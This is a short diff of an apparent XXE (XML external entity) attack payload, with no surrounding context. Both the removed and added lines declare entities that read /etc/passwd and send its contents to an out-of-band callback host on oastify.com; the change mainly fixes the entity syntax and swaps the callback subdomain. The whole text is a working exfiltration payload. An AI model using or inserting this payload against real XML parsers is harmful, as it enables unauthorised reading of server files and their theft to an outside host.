@@ -1,4 +1,4 @@
-<!ENTITY  file SYSTEM "file:///etc/passwd">
-<!ENTITY % xxe SYSTEM "http://eewocfw68bukghq613m6f0qrwi29q0ho6.oastify.com/?x=%file"> %xxe;]>
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % xxe SYSTEM "http://ezhoxfh6tbfk1hb6m37600brhin9b04ot.oastify.com/?x=%file"> %xxe;]>
 
 
